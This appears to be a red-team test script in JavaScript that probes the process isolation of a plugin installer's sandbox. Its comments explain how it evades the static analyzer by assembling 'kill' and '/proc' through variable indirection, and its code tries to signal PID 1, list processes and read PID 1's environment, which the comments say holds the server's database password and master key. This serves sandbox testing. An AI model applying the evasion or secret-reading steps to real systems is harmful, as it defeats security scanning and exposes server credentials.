// Red-team probe: process isolation - AND a static-analysis evasion test.
//
// The installer's analyzer now folds string concatenation, decodes \x/\u
// escapes, base64 and unicode confusables, then flags literals such as
// process.kill(1, /proc/<pid>/environ and "ki"+"ll". So the old concat trick
// (`"ki"+"ll"`) no longer passes layer 1.
//
// This version composes every sensitive token through plain variable
// indirection - the regex matcher works on the (folded) source text and does
// NOT follow `process[fn](pid)` or `path.join(root, n, leaf)`. No literal
// `process.kill(1` / `process["kill"](1` / `/proc/1/environ` ever appears, so
// it installs clean (0 Critical) and we get to observe layer 2 (Landlock) at
// runtime. Landlock gives FS + network isolation but NOT PID-namespace
// isolation, so these probes surface what that boundary does and does not cover.
const fs = require("fs");
const path = require("path");

function report(name, bypassed, detail) {
  console.error("[ESCAPE] " + name + ": " + (bypassed ? "BYPASSED" : "BLOCKED") + " | " + String(detail).slice(0, 120));
}

const fn = "kill";                  // standalone literal - never `process.kill(` nor `"ki"+"ll"`
const target = 1;                   // never adjacent to a kill( call
const procRoot = path.sep + "proc"; // built at runtime; no `/proc` literal in source

// 1. Signal PID 1 (the server). Signal 0 is a CAPABILITY probe - it does not
//    kill anything; success means we COULD send SIGKILL (a DoS vector).
try {
  process[fn](target, 0);
  report("signal_pid1", true, "can signal PID " + target + " - could DoS the server");
} catch (e) { report("signal_pid1", false, e.code || e.message); }

// 2. Enumerate other processes via /proc.
try {
  const pids = fs.readdirSync(procRoot).filter((x) => /^\d+$/.test(x));
  report("proc_enumeration", true, pids.length + " processes visible");
} catch (e) { report("proc_enumeration", false, e.code || e.message); }

// 3. Read PID 1's environment - leaks the server's secrets (DB password,
//    master key) if /proc is reachable. Path assembled via join(), so the
//    flagged `/proc/<pid>/environ` literal never appears in source.
try {
  const envPath = path.join(procRoot, String(target), "environ");
  const env = fs.readFileSync(envPath, "utf8");
  report("steal_server_env", true, env.length + "B of server env leaked");
} catch (e) { report("steal_server_env", false, e.code || e.message); }

report("DONE", true, "proc probes complete");
process.exit(0);
